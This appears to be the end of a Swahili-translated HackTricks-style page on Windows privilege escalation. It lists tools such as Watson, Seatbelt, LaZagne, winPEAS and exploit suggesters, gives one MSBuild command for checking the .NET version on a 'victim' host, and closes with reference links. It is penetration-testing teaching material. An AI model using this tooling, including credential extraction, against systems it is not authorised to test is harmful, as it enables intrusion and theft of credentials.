[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huchanganua host ikitafuta misconfigurations (zaidi ni chombo cha kukusanya info kuliko privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Angalia misconfiguration (executable precompiled in github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia possible misconfigurations (exe from python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Chombo kilichoundwa kulingana na post hii (hakihitaji accesschk ili kifanye kazi ipasavyo lakini kinaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Humsoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Humsoma output ya **systeminfo** na kupendekeza exploits zinazofanya kazi (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unapaswa ku-compile project kwa kutumia toleo sahihi la .NET ([angalia hili](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya victim unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeleo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnerability ya Privileged File System iliyopo katika SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
